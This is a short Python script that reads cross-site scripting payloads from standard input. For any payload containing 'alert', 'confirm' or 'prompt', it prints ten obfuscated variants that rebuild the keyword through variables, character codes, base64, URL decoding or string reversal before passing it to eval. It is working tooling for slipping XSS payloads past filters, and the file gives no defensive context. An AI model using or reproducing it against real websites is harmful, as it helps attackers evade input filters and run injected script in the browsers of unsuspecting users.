import sys
import re
import base64
from urllib.parse import quote

def variable_obfuscate(payload):
    keywords = ['confirm', 'alert', 'prompt']
    for keyword in keywords:
        pattern = re.compile(keyword, re.IGNORECASE)
        match = pattern.search(payload)
        if match:
            start = match.start()
            encoded_payloads = []
            
            rest = payload[start + len(keyword):]
            
            # Variable-based obfuscation
            encoded_payloads.append(f"var _0x='{keyword}';eval(_0x+'{rest}')")
            
            # Multiple variables
            char_list = ','.join(f"'{c}'" for c in keyword)
            encoded_payloads.append(f"var _=[{char_list}];eval(_.join('')+'{rest}')")
            
            # Variable with String.fromCharCode
            char_codes = ','.join(str(ord(c)) for c in keyword)
            encoded_payloads.append(f"var _=String.fromCharCode({char_codes});eval(_+'{rest}')")
            
            # Variable with split
            encoded_payloads.append(f"var _='{keyword}'.split('');eval(_.join('')+'{rest}')")
            
            # Variable with reverse
            encoded_payloads.append(f"var _='{keyword[::-1]}'.split('').reverse().join('');eval(_+'{rest}')")
            
            # Multiple character variables
            var_parts = ';'.join(f"var _{i}='{c}'" for i, c in enumerate(keyword))
            var_usage = '+'.join(f"_{i}" for i in range(len(keyword)))
            encoded_payloads.append(f"{var_parts};eval({var_usage}+'{rest}')")
            
            # Variable with atob
            b64_keyword = base64.b64encode(keyword.encode()).decode()
            encoded_payloads.append(f"var _=atob('{b64_keyword}');eval(_+'{rest}')")
            
            # Variable with decodeURIComponent
            url_keyword = quote(keyword)
            encoded_payloads.append(f"var _=decodeURIComponent('{url_keyword}');eval(_+'{rest}')")
            
            # Variable with slice
            encoded_payloads.append(f"var _='{keyword}';eval(_.slice(0)+'{rest}')")
            
            # Variable with substring
            encoded_payloads.append(f"var _='{keyword}';eval(_.substring(0)+'{rest}')")
            
            return encoded_payloads
    return [payload]

if __name__ == "__main__":
    for line in sys.stdin:
        payload = line.strip()
        encoded_payloads = variable_obfuscate(payload)
        for ep in encoded_payloads:
            print(ep)

